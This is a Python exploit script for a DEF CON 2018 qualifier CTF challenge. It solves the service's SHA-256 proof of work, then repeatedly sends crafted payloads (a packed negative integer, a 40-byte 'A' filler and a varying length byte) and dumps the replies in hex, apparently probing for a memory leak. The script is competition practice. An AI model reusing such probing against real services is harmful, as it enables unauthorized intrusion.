from pwnlib import *
import sys
import struct
import hashlib
import time

# inspired by C3CTF's POW

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

s = Socket(("e4771e24.quals2018.oooverflow.io", 31337))
s.ru("Challenge: ")
chall = s.ru("\n")
s.ru("n: ")
n = int(s.ru("\n"))
print("Solving pow: %s %s" % (chall, n))
sol = solve_pow(chall, n)
print("solved: %s" % sol)
s.send("%d\n" % sol)



print s.recv()
s.ru("Go\n")



num = (-80 + (1<<64))


#n = 237
n = 0

offset = 0

while True:
	print("num: %d" % (num - (1<<64)))
	print("n: %d" % n)
	#print("offset: %d" % offset)

	payload = pq(num)
	#payload += chr(offset)*n
	#payload += pq(0x400000)
	payload += "A"*40
	#payload += pq(0)*n
	#payload += pq(0x400000)
	#payload += pq(0)*3

	s.send(payload)
	time.sleep(0.4)
	s.send(chr(n))
	time.sleep(0.4)
	s.send("BBBB")


	print("Result:")
	res = s.recv()
	print(res)
	print(res.encode("hex"))

	#offset += 1


	#num -= 8
	n += 10



#from IPython import embed; embed()


s.interact()
